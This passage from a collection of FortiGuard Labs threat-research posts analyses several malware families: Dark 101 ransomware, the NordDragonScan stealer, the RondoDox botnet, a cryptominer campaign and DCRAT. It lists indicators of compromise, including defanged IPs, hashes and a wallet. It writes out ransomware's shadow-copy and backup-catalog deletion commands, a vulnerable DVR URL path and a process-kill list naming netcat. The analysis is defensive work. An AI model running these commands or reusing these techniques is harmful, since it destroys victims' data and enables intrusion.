In cloud environments, this results in significant financial impact, as compromised systems incur elevated compute costs, degraded performance, and increased operational risk. The campaign reflects a broader trend: the commodification of cybercrime, where access to prebuilt tools, LLM-generated code, and cheap infrastructure lowers the barrier to entry, enabling even low-skill actors to launch high-impact campaigns. Fortinet customers are protected from the threats described in this report through multiple layers of defense provided by theFortinet Security FabricandFortiGuard security services. FortiGuard Antivirus detects and blocks the components of this campaign with the following signatures: These signatures cover malicious VBScript loaders, PowerShell-based XMRig miners, shell scripts used by Kinsing, Trojans, and stealers, as well as payloads that attempt to overwrite the MBR or beacon to Cobalt Strike infrastructure. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus engine. Customers with up-to-date protections are already secured against these threats. Lacework FortiCNAPPhelps identify misconfigured cloud environments and runtime threats. It detects unauthorized mining activity, lateral movement, and the deployment of tools like XMRig or Kinsing in containerized or VM-based workloads. FortiCNAPP also correlates risk across posture, identity, and behavior to help prioritize critical vulnerabilities before they are exploited. TheFortiGuard Content Disarm and Reconstruction (CDR)service, available on FortiGate and FortiMail, can remove embedded threats from weaponized scripts and files—especially those delivered through phishing or lateral propagation. URLs used in this campaign, including malware delivery servers and C2 infrastructure, are rated as“Malicious Websites”by theFortiGuard Web Filtering service, preventing users from inadvertently accessing harmful payloads or ransom note URLs. FortiGuard IPSprovides network-level detection for indicators of malicious activity associated with both the H2Miner and Lcrypt0rx campaigns. Using deep-packet inspection and updated threat rules, it blocks: These protections cut off active infection vectors by identifying suspicious command-and-control behaviors and known malicious patterns. TheFortiGuard IP Reputation and Anti-Botnet Security Serviceblocks known malicious source IPs involved in mining operations, C2 activity, and dropper infrastructure. This service aggregates data from Fortinet’s global threat intelligence network, including FortiSandbox, honeypots, CERTs, and trusted partners. To help strengthen organizational resilience, Fortinet offers freesecurity awareness trainingthrough theNSE Training Institute: If you believe your organization has been impacted by Lcrypt0rx, H2Miner, or any related threats, please contactthe FortiGuard Incident Response Team To stay informed of new and emerging threats, sign up forFortiGuard Threat Intelligence alerts 78[.]153[.]140[.]6680[.]64[.]16[.]24189[.]208[.]104[.]17547[.]97[.]113[.]36176[.]65[.]137[.]203185[.]156[.]72[.]9680[.]64[.]18[.]161207[.]231[.]109[.]252104[.]21[.]32[.]1 Files ff1706b37fea16d75b739a5396d9ffba9e4f149dae1891f1d22a2cea4f68432ea729410de4dc397d1fb2ab8f7ae560d32726145d4ef3b34d3c3a566177805c391aee8a425ea53c571a16b8efde05ba01B6cd214bb814362694cc48299ebaf0e50680df49e1866c86697028ea73d28d28d3884cc519c6855ae20d64264d5f6e9357f0fdec4d919db0bd4576dc84aec75244143827116c96f5dcace4f95dff8697 1bf1efeadedf52c0ed50941b10a2f468a7bee104bb486ad0f10331233cc9a9f10dc2c71ce9c6c34668e9636abf61b1ae01e5b2530d4cba34f91c8090d19c92db Kinsing dbc9125192bd1994cbb764f577ba5ddab3039abf2ad5202f4a9363b418002351da753ebcfe793614129fc11890acedbcccef46c7edf9131ccffc47bd69eb743b 06a482a6096e8ff4499ae69a9c150e92f5f2b61b39105a2b1e6e1a5f4a3863ae9f764ec91535eaf03983b930d9f3bacd Wallet 4ASk4RhUyLL7sxE9cPyBiXb82ofekJg2SKiv4MKtCbzwHHLQxVVfVr4D4xhQHyyMTieSM5VUFGR9jZVR5gp6sa1Q2p8SahC89UoMhtsrpaJTvmJBbvy1cTdg38pomPFnW5Z4sniL2izcLQyGBkEGd96TcBJtzQUi6KAL5Ehe4cFpEMNdGF7tFKpJ1DqE8X89Arz88KTafhoTPAseYf2bfcWSjNq1YLaVY7ZkFaU21FivDueX4d7X7UErnyjAWHsVB1mibdTGHzqUTsS5FCMog89GVcQCh FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/old-miner-new-tricks"
  },
  {
    "title": "How FortiSandbox 5.0 Detects Dark 101 Ransomware Despite Evasion Techniques",
    "content": "FortiGuard Labs Threat Research Exposing the attack chain—from evasion to ransom note deployment The FortiGuard Labs team recently identified a ransomware that belongs to the Dark 101 malware family. The ransomware is delivered as an obfuscated .NET binary with the objectives of encrypting the victim’s personal files, deleting backup copies and the backup catalog, disabling recovery mode and Task Manager, and ultimately demanding a ransom payment in Bitcoin to decrypt the files. All behavioral data presented in this article was obtained from a Sandbox report, while additional reverse engineering was conducted to uncover further capabilities of the malware. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The FortiSandbox report documented the malware's behavior and provided visual aids to support the analysis. The following Tree View diagram (Figure 1) illustrates the execution sequence, outlining the chronological order of actions and processes initiated by the ransomware. The visual representation provides valuable insights into the malware’s operational flow, allowing users to track its behavior and comprehend its execution logic. Additionally, suspicious indicators triggered during the analysis were recorded (Figure 2), offering further context and aiding in the identification of suspicious and malicious activities. The ransomware first attempts to detect an analysis environment by checking whether the executable is running outside the %Appdata% folder. If so, it introduces a 10-second delay before continuing execution. However, FortiSandbox accurately simulates a realistic user environment by executing the sample from an expected location, allowing the ransomware to proceed without delay or altered behavior, thereby ensuring full visibility during analysis. An image of the sleepOutOfTempFolder function responsible for this environment check and delay is shown in Figure 3. Afterwards, the ransomware copies itself into the %Appdata% folder and renames itself to svchost.exe. This name mimics a legitimate Windows system process, which normally resides in C:\\Windows\\System32. By adopting this trusted name, the ransomware attempts to evade detection and reduce the chance of raising suspicion among users and automated tools. As shown in Figure 4, FortiSandbox correctly flags this process as high risk due to its suspicious behavior and inconsistent file location. As part of its anti-recovery strategy, the Dark 101 ransomware executes a series of destructive system commands designed to eliminate any possibility of restoring encrypted files through Windows’ built-in recovery features. Specifically, it runs the following commands, shown in Figures 5 and 6. The first two commands remove all Volume Shadow copies, which are typically used by the system to restore previous versions of the files. The third command deletes the Windows Backup catalog, effectively severing access to any system image backups that may have been created. By chaining these commands together, the ransomware ensures that both shadow copies and formal backup metadata are eradicated, leaving the victim with no local recovery option. Following the execution of vssadmin, wmic, and wbadmin commands to eliminate recovery options, the Dark 101 ransomware proceeds to disable Task Manager by modifying the Windows Registry. It sets the DisableTaskMgr value under the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System key to 1, which prevents users from launching the Task Manager. This tactic is commonly used to hinder user intervention, making it more difficult to terminate the ransomware process or inspect running activity. By restricting access to a critical system tool, the malware increases its persistence. Figure 7 shows the registry modification captured during execution. After disabling recovery mechanisms and system utilities, the ransomware begins scanning the file system directories for targets to encrypt. It targets user-accessible locations that are likely to contain personal or sensitive data, while avoiding critical system files and directories to prevent system instability. The ransomware maintains a predefined list of file extensions that are associated with documents, images, archives, databases, and other valuable content. Only files matching these extensions are selected for encryption, maximizing impact while minimizing the risk of a system failure. Once a file is identified and deemed valid for encryption, the ransomware encrypts its content and appends a randomly generated four-character extension to the filename. This not only renders the file unusable but also serves as a marker indicating successful encryption. Figure 8 displays a partial list of file extensions targeted during the encryption To inform the victim and demand payment, the Dark 101 ransomware drops a ransom note named read_it.txt into every directory containing encrypted files. This text file serves as an extortion message, notifying the victim that their data has been encrypted and providing detailed instructions on how to make a ransom payment. The note demands payment in Bitcoin and typically includes a unique identifier or contact information, such as an email address, to establish communication with the attacker. This tactic is designed to pressure the victim into complying with the ransom demands. Figure 10 shows the ransom note captured during analysis. With the ransom note deployed and encryption complete, the execution phase of the Dark 101 ransomware is complete. At this point, the malware has disabled recovery options, encrypted valuable files, and left payment instructions to coerce the victim into compliance. FortiSandbox successfully captured each stage of the attack—from evasion and execution to encryption and extortion, enabling comprehensive behavioral analysis and the extraction of threat intelligence. MITRE ATT&CK The table below lists the techniques used by the ransomware. This analysis of Dark 101 ransomware highlights the sophistication of modern malware and the need for proactive defense. FortiSandbox effectively detects and documents malicious behavior, showcasing its critical role in protecting against evolving cyber threats. The malware described in this report is detected and blocked byFortiGuard Antivirusas: MSIL/Kryptik.SAC!tr.ransom The FortiGuard AntiVirus engine is part of the FortiGate, FortiMail, FortiClient, and FortiEDR solutions. Customers who have these products with up-to-date protections are protected. FortiGuard Sandbox servicedetects the ransomware file as High Risk in the Ransomware category. We also suggest that our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end-users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. ae3dd3d1eedb6835e6746d51d9ab21c6 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr = 1 Vssadmin delete shadows /all /quietWmic shadowcopy deleteWbadmin delete catalog –quiet %APPDATA%\\svchost.exeRead_it.txt FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/fortisandbox-detects-dark-101-ransomware-despite-evasion-techniques"
  },
  {
    "title": "Catching Smarter Mice with Even Smarter Cats",
    "content": "FortiGuard Labs Threat Research How AI is Reshaping the Malware Arms Race From the beginning, the antivirus world has been acat-and-mousegame, where malware authors and antivirus engineers constantly adapt their code to bypass or catch each other. Artificial Intelligence is bringing the game to the next level, with malware authors using AI to improve their malware[1] and anti-virus engineers using AI to assist them with reverse engineering[2]. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Nowadays,nearly all malware is packed and/or obfuscated. AI doesn’t help (yet) for packers: we tried this on a Linux/Prometei botnet sample from February 2025, and the AI would have wasted time reversing the inner logics of the packer if we hadn’t helped it out. To be fair,unpacking is a difficult task that current disassemblers like IDA Pro or Ghidra can’t do either.It’s something an AV analyst has to perform beforehand and then supply the unpacked binary for further analysis. As for obfuscation, the news is far better. While AI would probably fail and require human assistance for complicated obfuscation, it works reasonably well over standard obfuscation and junk code. This is a significant advancement for the antivirus industry. In the example below, the AI successfully analyzed the obfuscation algorithm of Linux/Ladvix.E and implemented a working de-obfuscator.[3] Another technique which has been trending in the malware scene for a few years is the use of specific frameworks (e.g, Flutter [4]) or high-level languages (Go, Rust). Currently, AI struggles with Flutter and Rust malware, which is not surprising because the field is still new. Human researchers struggle to find solutions, too! We tried AI-assistance over the “Flutter assembly” of Android/SpyLoan: it was totally helpless, didn’t map function names or strings, etc. However, when we proceed in a smarter way and produce the Blutter[5]output for the malware, thenAI is able to reconstruct very readable Dart code. AI is quite successful with the older Delphi language. We assume the reason is that LLMs were trained with Delphi and Pascal material. Despite being old, Delphi is still strangely used to implement Linux/Filecoder.BR!tr (aka Trigona) ransomware (sample from April 2025). For example, Ghidra meticulously decompiles the main function of the ransomware. We can immediately identify Delphi function names (e.g SYSTEM_RANDOM), followed by their types (LONGINT, LONGINT), and inner memory management functions (FPC_ANSISTR_DECR_REF). The former are interesting because they correspond to code that the malware author explicitly called. The latter are not interesting for malware analysis as they are inserted by the compiler (Free Pascal Compiler, in this case) to handle Ansi strings. When asked to decompile the same function,the AI smartly removes those inner calls and produces source code that is way easier to readthan what Ghidra gave. The anti-virus world has always been a cat-and-mouse game. While AI is close to defeating standard string and code obfuscation, malware authors are likely to adapt by using more complex obfuscation. Similarly, malware authors can harden reverse engineering by using recent frameworks and languages. So, where’s the progress, might you argue? The main difference is that, for once, the antivirus industry has a new tool that helps it more than the adversary. We areforcingmalware authors to use more complex obfuscation and newer frameworks and languages. Rust is more secure than C? Sure! Butthey have to make the effort to learn how to use Rust, use new libraries, cope with bugs, etc. And while they do that, our LLMs can update and train on those novelties even faster. Yes,it’s the first time in 20 years where time and tools are in our favor. Fortinet customers are already protected from all malware mentioned in this article through our AntiVirus as follows: FortiGuard Labs detects the sample with the following AV signatures: Linux/Ladvix.E, Linux/Prometei.B, Adware/SpyLoan!Android, Linux/Filecoder.BR!tr TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. 943e1539d07eaffa4799661812c54bb67ea3f97c5609067688d70c87ab2f0ba4 – Linux/Ladvix.Ecc7ab872ed9c25d4346b4c58c5ef8ea48c2d7b256f20fe2f0912572208df5c1a – Linux/Prometei.Bc65298b6cd5a1769c747a0c7fb589ffa12fdf832b64787283953eaa57b65bc1c – Adware/SpyLoan!Androidc08a752138a6f0b332dfec981f20ec414ad367b7384389e0c59466b8e10655ec – Linux/Filecoder.BR!tr [1] https://www.hp.com/us-en/newsroom/press-releases/2024/ai-generate-malware.html [2]https://arxiv.org/html/2504.07574 [3]https://asciinema.org/a/724126Asciinema video of Linux/Ladvix deobfuscation [4]https://www.fortiguard.com/events/5552/virus-bulletin-2024-android-flutter-malware [5]https://github.com/worawit/blutter artificial intelligence FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/catching-smarter-mice-with-even-smarter-cats"
  },
  {
    "title": "NordDragonScan: Quiet Data-Harvester on Windows",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attacksSeverity Level:High FortiGuard Labs recently uncovered an active delivery site that hosts a weaponized HTA script and silently drops the infostealer “NordDragonScan”into victims’ environments. Once installed, NordDragonScan examines the host and copies documents, harvests entire Chrome and Firefox profiles, and takes screenshots. The package is then sent over TLS to its command-and-control server, “kpuszkiev.com,” which also serves as a heartbeat server to confirm the victim is still online and to request additional data when needed. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Attackers leverage shorter link services with “hxxps://cutt[.]ly/4rnmskDe” that redirects to “hxxps://secfileshare[.]com,” triggering the download of a RAR archive named “Укрспецзв_Акт_30_05_25_ДР25_2313_13 від 26_02_2025.rar” (Ukrspetszv_Act_30_05_25_DR25_2313_13 dated 26_02_2025). This file contains a malicious LNK shortcut that silently invokes mshta.exe to execute the hosted HTA payload “1.hta” from the same server. The malicious HTA file copies the legitimate PowerShell.exe binary to the path “C:\\Users\\Public\\Documents\\install.exe” to mask itself. It then downloads an encoded TXT file from a remote server, decodes it, and saves the result as “Act300525.doc.” This decoy document, titled “Акт здачі-приймання наданих Послуг до договору про надання послуг” (Act of Acceptance of Services under Service Agreement), is benign and intended to distract the user. Finally, the HTA script quietly drops and executes the actual malicious payload, embedded as a hardcoded executable named adblocker.exe, into the victim’s directory “\\AppData\\Local\\Temp\\adblocker.exe.” The attacker’s server maintains multiple decoy files designed to entice user interactions. These decoys employ a similar HTA script mechanism, which drops and executes the same payload, “adblocker.exe,” on compromised systems. The repeated use of the same executable across diverse decoys suggests a systematic approach by the threat actor to maximize infection opportunities while utilizing varied document themes and filenames to evade detection and security monitoring. The payload is a .NET executable containing an embedded PDB path: “C:\\Users\\NordDragon\\Documents\\visual studio.” NordDragonScan employs a custom string obfuscation routine, which performs an XOR operation and byte-swapping to conceal hard-coded strings from static analysis. It initially verifies if its dedicated working directory, “NordDragonScan,” exists in the “%LOCALAPPDATA%” folder. If this directory is absent, it creates it as a staging area to temporarily store stolen data before uploading it to the C2 server. It contacts the C2 server, ”kpuszkiev.com,” that contains specially crafted HTTP headers, specifically, “User-Agent: RTYUghjNM,” along with the victim machine’s MAC address. During its initial connection, the primary objective is to retrieve a dynamic URL from the C2, which it later leverages as an endpoint for exfiltrating stolen data. It then sets up persistence by adding a registry “NordStar” in “Software\\Microsoft\\Windows\\CurrentVersion\\Run.” After the connection, NordDragonScan pivots to local reconnaissance. It retrieves the victim’s basic information, including computer name, username, OS version, architecture, processor count, driver information, and RAM using a combination of WMI (Win32_OperatingSystem, Win32_ComputerSystem) and .NET environment calls. The stealer then enumerates every active network adapter, extracts the primary IPv4 address and subnet mask, and calculates the full CIDR range. It then initiates lightweight probes to each address in the same subnet, building an inventory of reachable hosts on the same local area network (LAN). It also captures a screenshot and saves it as “SPicture.png” and collects data from the targeted Chrome and Firefox browsers. NordDragonScan next scans the local file system, includingDesktop,Documents, andDownloadsfolders, and copies the files in these folders with the following extensions: “.docx,” “.doc,” “.xls,” “.ovpn,” “.rdp,” “.txt,” and “.pdf.”Once it obtains a matched file, it copies it into the working directory and groups it according to the source from which it was obtained. When the scanning stage is complete, it initiates a POST to the C2 server. That request carries the custom header “User-Agent: Upload,” a second header, “Backups:,” and the name of the data it is about to send, such as “sysinfo.txt” for system information. NordDragonScan utilizes an effective distribution network for dissemination. The RAR file contains LNK calls that invoke mshta.exe to execute a malicious HTA script, displaying a decoy document in Ukrainian. Finally, it quietly installs its payload in the background. NordDragonScan is capable of scanning the host, capturing a screenshot, extracting documents and PDFs, and sniffing Chrome and Firefox profiles. Users should treat LNK shortcuts and untrusted compressed archives with extreme caution. The malware described in this report is detected and blocked byFortiGuard Antivirusas: LNK/Agent.ALC!trVBS/Dropper.B!trMSIL/Agent.FFF!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (Content Disarm and Reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. secfileshare[.]comkpuszkiev[.]com 2102c2178000f8c63d01fd9199400885d1449501337c4f9f51b7e444aa6fbf50e07b33b5560bbef2e4ae055a062fdf5b6a7e5b097283a77a0ec87edb7a3547253f3e367d673cac778f3f562d0792e4829a919766460ae948ab2594d922a0edae f8403e30dd495561dc0674a3b1aedaea5d6839808428069d98e30e19bd6dc045fbffe681c61f9bba4c7abcb6e8fe09ef4d28166a10bfeb73281f874d84f69b3d39c68962a6b0963b56085a0f1a2af25c7974a167b650cf99eb1acd433ecb772b9d1f587b1bd2cce1a14a1423a77eb746d126e1982a0a794f6b870a2d7178bd2c7b2b757e09fa36f817568787f9eae8ca732dd372853bf13ea50649dbb62f0c5b f4f6beea11f21a053d27d719dab711a482ba0e2e42d160cefdbdad7a958b93d0 Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/norddragonscan-quiet-data-harvester-on-windows"
  },
  {
    "title": "RondoDox Unveiled: Breaking Down a New Botnet Threat",
    "content": "FortiGuard Labs Threat Research A new botnet built for evasion and disruption Affected Platforms:TBK DVR-4104. TBK DVR-4216. Four-Faith router models F3x24. Four-Faith router models F3x36.Impacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High Over the past month, FortiGuard Labs has observed a significant increase in scanning activity, including a new botnet campaign that exploits two high-risk vulnerabilities:CVE-2024-3721andCVE-2024-12856. Both have been publicly disclosed and are actively being targeted, posing serious risks to device security and overall network integrity. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The botnet responsible for these attacks has been namedRondoDox. Unlike widespread variants such as Mirai or Gafgyt, RondoDox is a relatively new and low-profile threat. FortiGuard Labs first identified a similar ELF binary in September 2024. Notably, RondoDox incorporates custom libraries and mimics traffic from gaming platforms or VPN servers to evade detection. CVE-2024-3721is a critical vulnerability affecting TBK DVR models, including DVR-4104 and DVR-4216, as of April 12, 2024. The flaw stems from improper handling of the /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___ path, where the mdb and mdc parameters can be manipulated to inject OS commands. Successful exploitation allows remote attackers to execute arbitrary commands on affected devices. CVE-2024-12856impacts Four-Faith router models F3x24 and F3x36. The vulnerability allows authenticated remote attackers to execute arbitrary operating system commands via HTTP by exploiting the apply.cgi interface when modifying the system time. RondoDox was initially distributed to target Linux-based operating systems running on ARM and MIPS architectures. However, recent findings show the emergence of a shell script downloader that suggests the malware is now capable of targeting a broader range of Linux architectures, including Intel 80386, MC68000, MIPS R3000, PowerPC, SuperH, ARCompact, x86-64, and AArch64. The shell script begins by instructing the victim host to ignore several signals, including SIGTTOU, SIGTTIN, SIGTSTP, SIGHUP, SIGPIPE, SIGINT, SIGQUIT, and SIGTERM. It then checks for writable paths such as /dev, /dev/shm, the victim user’s home directory, /mnt, /run/user/0, /var/log, /var/run, /var/tmp, and /data/local/tmp, verifying if any are mounted without the noexec flag as listed in /proc/mounts. Finally, it creates a lib directory inside /tmp, downloads and executes the “RondoDox” malware, and clears the command execution history to evade detection. The following analysis focuses on the x86-64 architecture binary named rondo.x86_64. The RondoDox malware encodes its configuration data using a simple XOR obfuscation algorithm. This includes elements such as file paths and tool filenames. All encoded values can be decrypted using the hexadecimal key 0x21. After decoding its configuration data, RondoDox implements a persistence mechanism to maintain its presence on the victim host. RondoDox modifies file permissions and symbolic links to establish persistence. As shown in Figure 6, the XOR-encoded values byte_51D670 and byte_51D6C0 decode to /etc/init.d/rondo and /etc/rc3.d/S99rondo, respectively. Additionally, the malware embeds a shell script designed to execute its persistence routines on the victim system. In addition to using init scripts, RondoDox appends its launch command to several system startup files, including /etc/rcS, /etc/init.d/rcS, and /etc/inittab, as well as to both user and root crontab entries. This layered persistence strategy ensures that even if one method is removed or disabled, others remain active to automatically reinstate the botnet upon system reboot. Upon execution, RondoDox retrieves its own process ID and scans the system for specific applications. It looks for keywords associated with network utilities (such as wget and curl), system analysis tools (like Wireshark and gdb), or other malware (e.g., cryptominers or Redtail variants). If any such processes are detected, RondoDox immediately terminates them to evade analysis and maintain operational stealth. dhpcd apcid redtail xmrig miner ps top htop pstree lsof netstat ss wireshark tshark ngrep dumpcap tcpdump passwd chpasswd iptables nc netcat ufw gdb gdbserver cgdb strace valgrind stap dtrace sysdig bpftrace scp shutdown poweroff halt reboot During analysis of RondoDox, we noticed that the malware writes the email address vanillabotnet@protonmail[.]com to the file tmp/contact.txt. However, no further use of this address has been observed within the malware’s execution flow or command logic. Next, RondoDox scans several common Linux executable directories, including: It then renames selected executable files to hardcoded strings of random characters. This action is intended to disrupt critical system functions, including firewall configuration, user account management, and shutdown operations. By corrupting these binaries, the malware impairs system stability and complicates recovery efforts. Original File Name Modified File Name Iptables jsuJpf ufw nqqbsc passwd ahwdze chpasswd ereghx shutdown hhrqwk poweroff dcwkkb halt cjtzgw reboot gaajct After completing its setup routines, RondoDox decodes its command-and-control (C2) server address—83[.]150[.]218[.]93—using the key \"rondo\", and then initiates a connection to the server. The malware receives commands from its C2 server for subsequent DDoS attacks. RondoDox is capable of launching distributed denial-of-service (DDoS) attacks using three primary protocols: HTTP, UDP, and TCP. To evade detection, it disguises malicious traffic by emulating popular games and platforms such as Valve, Minecraft, Dark and Darker, Roblox, DayZ, Fortnite, GTA, as well as tools like Discord, OpenVPN, WireGuard, and RakNet. For example, when RondoDox receives a command from its C2 server to attack a specific target while impersonating OpenVPN traffic, it crafts packet payloads that include the OpenVPN \"magic byte,\" which begins with \\x38, as shown in Figure 17. Beyond gaming and chat protocols, RondoDox can also mimic custom traffic from tunneling and real-time communication services, including WireGuard, OpenVPN variants (e.g., openvpnauth, openvpncrypt, openvpntcp), STUN, DTLS, and RTC. By impersonating these legitimate services, the malware significantly increases the difficulty for defenders in effectively identifying and blocking its traffic. RondoDox is a sophisticated and emerging malware threat that employs advanced evasion techniques, including anti-analysis measures, XOR-encoded configuration data, custom-built libraries, and a robust persistence mechanism. These capabilities allow it to remain undetected and maintain long-term access on compromised systems. The malware primarily exploits two known vulnerabilities—CVE-2024-3721andCVE-2024-12856—highlighting the critical need for timely patching of affected systems. Its use of obfuscation, service mimicry, and multi-layered persistence underscores its growing threat potential. Ongoing monitoring, threat intelligence sharing, and in-depth behavioral analysis are crucial for comprehending the full extent of RondoDox and for developing effective detection and mitigation strategies. The malware described in this report is detected and blocked byFortiGuard Antivirusas: BASH/RondoDox.A!tr.dldrELF/RondoDox.CTO!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 server. FortiGuard Labs provides an IPS signature against attacks exploiting the following vulnerabilities: CVE-2024-3721: TBK.DVR.SOSTREAMAX.Command.InjectionCVE-2024-12856: Four-Faith.Routers.adj_time_year.Command.Injection We also suggest that organizations consider completingFortinet’s free trainingmodule,Fortinet Certified Fundamentals(FCF) in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 45[.]135[.]194[.]3483[.]150[.]218[.]9314[.]103[.]145[.]20214[.]103[.]145[.]211154[.]91[.]254[.]9578[.]153[.]149[.]90 Downloader c88f60dbae08519f2f81bb8efa7e6016c6770e66e58d77ab6384069a515e451ceb3e2a6a50f029fc646e2c3483157ab112f4f017406c3aabedaae0c94e0969f6f4cd7ab04b1744babef19d147124bfc0e9e90d557408cc2d652d7192df61bda9 RondoDox e3c080e322862d065649c468d20f620c3670d841c30c3fe5385e37f4f10172e7e62df17150fcb7fea32ff459ef47cdd452a21269efe9252bde70377fd2717c1053e2c2d83813d1284ddb8c68b1572b17cca95cfc36a55a7517bf45ff40828be543d4847bf237c445ed2e846a106e1f55abefef5c3a8545bd5e4cad20f5deb9a44c2429fc8b8ec61da41cbba1b8184ec45fa93a9841b4ca48094bba7741b826b8694d729d67f1b0c06702490bfab1df3a96fe040fe5d07efa5c92356c329757beedae3b75deb8013bd48ac4534cca345b90938a2abb91672467c2bf9ae81ff6830814a0781ab30fca069a085dba201d6fd0f414498fafa4bb42859786d91d478159b4deee977e9e27b60e7e179d54a1ce8e56624e73b799523416eee828bfaf769f916a552efc6775367a31357a633dc0be01879830d3fddccdf3c40b26e50afd0a9ebbecc8ec58c253039520304ca373cfb8d1674d67993e6485e244a77d6ec96c81fd73b4bef6fef379cbefdcce7f374ea7e6bf1bf0917cf4ca7b72d4cee788a55a3859a203ca2bae7399295f92aeae61d845ffa173c1938f938f5c148eef9957573779f9a62eecb80737d41d42165af8bb9884579c50736766abb63d2835ba3daa53204978b7797bd53f5c964eed7a73d971517a764785ce3ab65a9423c2e78bf8928bc255e73e0b5b0ce13747c64d82d5f2647da129f189138773733ac21f20a24b179bdbbdcc0053838c0484ea25eff6976f2b8cb5630ab4efb28b0f06b542aa715573c7d2fca01914504cb7336db715d73d1e20d23e4bd37f2e4f4fe389c9278ce988343606350a94156ca28ee28bd605d1d95c810a16866eee1f997598a197f60d5f5641f2c56576b4c867d141612c6e00db29c512f266835510b8a62d8250d289c5ec87752cec1af31eed0347cf2dd54dc0fbeea645319c4dae238ee2d02414a54e97ad26748812002610f1491a2a746e9ba0f9d05de3d47d7bab4f5ec123a91fdacd9a4c0bcf800d6b7db5162cfd11cb71e260647ef0f2c60978ebfcef708fec1afbea4fb32b586e0dacf0d228c375a532008d81453c367256afea5a305507f34c14c72cab35715b7f7b25b32352a8e19b8a283003aaf539d12ca517937e6ab0dfcedfa23eced7b52d3899b0847df3fcb7a9c326b71027a7ab5f5b93 botnets,botnet FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/rondobox-unveiled-breaking-down-a-botnet-threat"
  },
  {
    "title": "DCRAT Impersonating the Colombian Government",
    "content": "FortiGuard Labs Threat Research Multi-layered obfuscation used to deploy remote access trojan Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Control and collect victim’s sensitive information from the victim’s devicePrevalence:Columbia targetedSeverity Level:High The FortiMail IR team recently uncovered a new email attack distributing a Remote Access Trojan called DCRAT. The threat actor is impersonating a Colombian government entity to target organizations in Colombia. The threat actor uses multiple techniques, such as a password protected archive, obfuscation, steganography, base64 encoding, and multiple file drops, to evade detection. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. 1. Modular ArchitectureDCRAT is designed with a modular structure, allowing attackers to add or remove plugins. This lets them tailor the RAT’s behavior to specific tasks like data theft, surveillance, or persistence. 2. Comprehensive Surveillance CapabilitiesThe RAT allows remote control over infected systems. Attackers can execute commands, manage files, monitor user activity, and even download or run additional malicious payloads. 3. Information TheftIt can steal sensitive information such as credentials, documents, browser data, and personal files. It also supports screenshot capture and keylogging to record user input. 4. System ManipulationDCRAT can alter system settings — rebooting, shutting down, logging off users, or creating new accounts. It can also change visual elements like wallpapers and taskbar visibility. 5. File and Process ManagementThe malware supports creating, deleting, renaming, or moving files and folders. It can run or terminate processes and upload/download files to or from the victim’s system. 6. Browser and Credential HarvestingIt specifically targets browsers to extract stored data such as cookies, browsing history, and saved login credentials. It can also open websites and perform actions in the user’s browser. The threat actor sends an email impersonating a Colombian government entity to trick the user to run the attachment contents while having the recipient in the BCC field: The ZIP attachment contains a bat file which will drop an obfuscated vbs file from a pastebin like website to C:\\Windows\\Temp: The vbs file is heavily obfuscated and is made to trick analysts and systems: After removing the junk and the obfuscation, we found the following, which eventually runs 